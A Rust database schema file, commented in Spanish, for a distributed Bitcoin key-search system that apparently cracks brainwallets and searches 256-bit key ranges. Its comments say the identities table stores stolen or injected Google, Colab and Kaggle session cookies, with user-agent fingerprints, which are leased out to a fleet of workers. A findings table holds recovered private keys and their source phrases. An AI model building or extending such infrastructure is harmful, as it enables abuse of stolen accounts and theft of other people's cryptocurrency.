// libs/infra/db-turso/src/schema.rs
// =================================================================
// APARATO: DATABASE SCHEMA MIGRATOR (V3.0 - TEST LAB ENABLED)
// RESPONSABILIDAD: DEFINICIÓN ESTRUCTURAL DEL LEDGER INDESTRUCTIBLE
// ESTRATEGIA: SQLITE/LIBSQL COMPLIANT & IDEMPOTENTE (IF NOT EXISTS)
// =================================================================

use anyhow::Result;
use libsql::Connection;
use tracing::info;

/// Aplica el esquema de base de datos de manera idempotente.
/// Se ejecuta cada vez que el Orquestador arranca para asegurar la integridad estructural.
pub async fn apply_schema(conn: &Connection) -> Result<()> {
    // -------------------------------------------------------------------------
    // 1. TABLA: IDENTITIES (IAM & CREDENTIALS)
    // Almacena las sesiones de Google/Kaggle robadas o inyectadas.
    // Soporta bloqueo optimista mediante 'leased_until'.
    // -------------------------------------------------------------------------
    conn.execute(
        r#"
        CREATE TABLE IF NOT EXISTS identities (
            id TEXT PRIMARY KEY,          -- UUID v4
            platform TEXT NOT NULL,       -- 'google_colab', 'kaggle', 'ideogram'
            email TEXT NOT NULL,          -- Identificador humano
            credentials_json TEXT NOT NULL, -- Cookies purificadas (JSON String)
            user_agent TEXT NOT NULL,     -- Fingerprint consistency
            status TEXT DEFAULT 'active', -- 'active', 'ratelimited', 'expired', 'revoked'
            usage_count INTEGER DEFAULT 0,
            leased_until INTEGER DEFAULT 0, -- Timestamp (ms) para bloqueo atómico
            last_used_at DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            -- Constraint para evitar duplicados de cuentas en la misma plataforma
            UNIQUE(platform, email)
        );
        "#,
        (),
    )
    .await?;

    // Índice para optimizar la búsqueda de credenciales libres (Lease Strategy)
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_identities_lease ON identities(status, leased_until);",
        (),
    )
    .await?;

    // -------------------------------------------------------------------------
    // 2. TABLA: JOBS (WORK ORDERS & LEDGER)
    // El libro mayor de rangos explorados.
    // IMPORTANTE: range_start/end son TEXT para soportar enteros de 256 bits (BigInt).
    // -------------------------------------------------------------------------
    conn.execute(
        r#"
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,          -- UUID v4
            range_start TEXT NOT NULL,    -- BigInt (Padded String)
            range_end TEXT NOT NULL,      -- BigInt (Padded String)
            status TEXT NOT NULL DEFAULT 'pending', -- 'pending', 'processing', 'completed'
            worker_id TEXT,               -- Asignado a...
            attempt_count INTEGER DEFAULT 0,
            started_at DATETIME,
            last_heartbeat_at DATETIME,   -- Para detección de Zombies
            completed_at DATETIME
        );
        "#,
        (),
    )
    .await?;

    // Índices críticos para el rendimiento del Orchestrator y el Reaper
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_jobs_reaper ON jobs(status, last_heartbeat_at);",
        (),
    )
    .await?;

    // Garantiza que no dos trabajos cubran el mismo rango exacto
    conn.execute(
        "CREATE UNIQUE INDEX IF NOT EXISTS idx_jobs_range ON jobs(range_start, range_end);",
        (),
    )
    .await?;

    // -------------------------------------------------------------------------
    // 3. TABLA: FINDINGS (THE VAULT)
    // Aquí se guardan las colisiones exitosas. Datos de alto valor.
    // -------------------------------------------------------------------------
    conn.execute(
        r#"
        CREATE TABLE IF NOT EXISTS findings (
            id TEXT PRIMARY KEY,          -- UUID v4
            address TEXT NOT NULL,        -- Bitcoin Address (P2PKH)
            private_key_wif TEXT NOT NULL,-- Wallet Import Format (SECRET)
            source_entropy TEXT NOT NULL, -- Origen (ej: "brainwallet:password123")
            wallet_type TEXT NOT NULL,    -- 'legacy', 'segwit', etc.
            found_by_worker TEXT,         -- Worker ID (Audit Trail)
            job_id TEXT,                  -- Link al Job original
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            FOREIGN KEY(job_id) REFERENCES jobs(id)
        );
        "#,
        (),
    )
    .await?;

    // -------------------------------------------------------------------------
    // 4. TABLA: WORKERS (FLEET TELEMETRY)
    // Registro de nodos activos e históricos para análisis de rendimiento.
    // -------------------------------------------------------------------------
    conn.execute(
        r#"
        CREATE TABLE IF NOT EXISTS workers (
            id TEXT PRIMARY KEY,          -- UUID v4 generado por el nodo
            ip_address TEXT,              -- IP Pública (si disponible)
            version TEXT,                 -- Versión del binario (ej: "v5.6")
            status TEXT DEFAULT 'online', -- 'online', 'offline'
            last_seen_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            hashrate_avg REAL,            -- Hashes/segundo promedio
            jobs_completed INTEGER DEFAULT 0
        );
        "#,
        (),
    )
    .await?;

    // -------------------------------------------------------------------------
    // 5. TABLA: TEST SCENARIOS (THE CRYPTO LAB) ✅ NUEVO
    // Escenarios de prueba generados por el usuario ("Golden Tickets") para
    // validar la integridad del sistema antes de campañas masivas.
    // -------------------------------------------------------------------------
    conn.execute(
        r#"
        CREATE TABLE IF NOT EXISTS test_scenarios (
            id TEXT PRIMARY KEY,          -- UUID v4
            name TEXT NOT NULL,           -- Nombre descriptivo (ej: "Alpha Test 01")
            secret_phrase TEXT NOT NULL,  -- La semilla de verdad
            target_address TEXT NOT NULL, -- La dirección esperada
            target_private_key TEXT NOT NULL, -- La clave esperada (validación cruzada)
            status TEXT DEFAULT 'idle',   -- 'idle', 'active', 'verified'
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            verified_at DATETIME          -- Cuándo fue encontrado por un worker
        );
        "#,
        (),
    )
    .await?;

    // Índice para filtrar escenarios en el Dashboard
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_scenarios_status ON test_scenarios(status);",
        (),
    )
    .await?;

    info!("✅ Schema V3 (Hydra-Zero + Test Lab) applied successfully via SQL.");

    Ok(())
}
